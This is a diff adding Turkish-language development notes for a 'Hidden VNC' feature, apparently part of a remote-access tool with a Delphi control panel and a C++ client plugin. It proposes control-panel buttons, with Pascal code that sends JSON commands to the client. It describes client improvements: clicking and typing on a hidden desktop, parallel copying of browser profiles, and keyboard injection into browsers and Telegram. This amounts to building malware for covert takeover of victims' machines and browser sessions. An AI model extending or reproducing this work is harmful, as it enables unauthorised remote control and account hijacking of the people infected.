@@ -1,0 +1,58 @@
+# Hidden VNC Server-Side Tasarım ve Geliştirme Notları
+
+Bu belgede, VNCFeature.cs ve C++ istemci eklentisinde yaptığımız köklü iyileştirmelerin Delphi sunucu tarafındaki kullanıcı arayüzü (UI) tasarımına entegre edilmesi için önerilen geliştirmeler yer almaktadır.
+
+---
+
+### 1. Önerilen Yeni Arayüz Bileşenleri (Delphi Designer)
+
+#### A. Tam Ekran Yenileme Butonu (Refresh / Force Full Frame)
+* **Açıklama:** İstemcinin sıkışan pencereleri veya çizim hatalarını aşması için manuel olarak tam kare tetikleyen bir "Yenile" butonu eklenebilir.
+* **Öneri:** `UnitHiddenVNC` formuna bir `TButton` (örneğin `ButtonRefresh`) ekleyin:
+  - **Caption:** Yenile
+  - **OnClick Olayı:**
+    ```pascal
+    procedure TForm10.ButtonRefreshClick(Sender: TObject);
+    var
+      JSONObj: TJSONObject;
+    begin
+      if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then Exit;
+      JSONObj := TJSONObject.Create;
+      try
+        JSONObj.AddPair('action', 'hvnc_quality'); // Kalite komutu otomatik olarak tam ekran güncellemesini zorlar
+        JSONObj.AddPair('quality', TJSONNumber.Create(StrToIntDef(StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]), 50)));
+        FSendJSON(FLine, JSONObj);
+        LogToStatus('Ekran güncellemesi zorlanıyor...');
+      finally
+        JSONObj.Free;
+      end;
+    end;
+    ```
+
+#### B. Dinamik FPS Kontrolü (ComboBox veya TrackBar)
+* **Açıklama:** Ağ bant genişliğine göre kare hızını (FPS) dinamik ayarlamak için bir FPS seçici eklenebilir.
+* **Öneri:** `UnitHiddenVNC` formuna bir `TComboBox` (örneğin `ComboBoxFPS`) veya `TTrackBar` ekleyin:
+  - **Değerler:** 5, 10, 15, 30, 60 FPS
+  - **OnChange Olayı:** `hvnc_quality` komutu gibi istemciye anlık FPS hedefi göndermek üzere geliştirilebilir.
+
+---
+
+### 2. Yapılan İyileştirmeler ve Çalışma Mantığı
+
+1. **Akıllı Pencere Algılama (SmartWindowFromPoint):**
+   - İstemci tarafında artık `WorkerW`, `Progman` ve `UserOOBEWindowClass` gibi masaüstü arka plan katmanları tıklama esnasında otomatik olarak es geçilir (`WS_EX_TRANSPARENT` stili dinamik olarak uygulanır). Böylece arka plana tıklansa dahi altındaki gerçek pencereler doğruca algılanır.
+
+2. **Gelişmiş Non-Client Tıklamaları (RefineNCHit):**
+   - Gizli masaüstünde DWM (Desktop Window Manager) aktif olmadığından, pencerelerin kapatma, simge durumuna küçültme ve ekranı kaplama butonlarına tıklamak klasik yöntemlerle kararsız çalışabiliyordu. Yeni geometrik buton analizi ile kapatma (Close), ekranı kaplama (Maximize/Restore) ve simge durumuna küçültme (Minimize) butonları kusursuz çalışır.
+
+3. **Paralel ve Hızlı Tarayıcı Profil Kopyalama:**
+   - Eski yavaş ve senkron kopyalama yerine, gereksiz ve kilitli klasörleri (Cache, GPUCache, vb.) ayıklayan **paralel 4-kanallı** bir kopyalama mimarisi kuruldu.
+   - Kopyalama esnasında Delphi formunuzdaki durum çubuğunda (`StatusBar1`) ilerleme durumu yüzde olarak anlık güncellenir (Örn: `Profiller kopyalanıyor (%45)...`).
+
+4. **Kusursuz Klavye ve Kısayol Desteği:**
+   - CapsLock, Shift, Ctrl ve Alt tuş durumları istemci tarafında hassasiyetle korunur.
+   - `Ctrl+A`, `Ctrl+C`, `Ctrl+V`, `Ctrl+X` ve `Ctrl+Z` gibi kritik metin kısayolları için hem `WM_KEYDOWN` hem de ilgili kontrol karakterleri (`WM_CHAR` 0x01, 0x03, 0x16 vb.) birlikte gönderilerek tarayıcı ve editörlerde tam uyumluluk sağlanmıştır.
+   - UIA pencereleri (`UIItemsView`) ve Qt tabanlı uygulamalar (Telegram, AyuGram) için senkronize mesaj iletimi entegre edilmiştir.
+
+---
+*Mevcut Delphi kod yapınız ve protokol akışınız tamamen korunmuş olup, yukarıdaki öneriler Delphi tarafında görsel konforu artırmak için isteğe bağlı olarak uygulanabilir.*
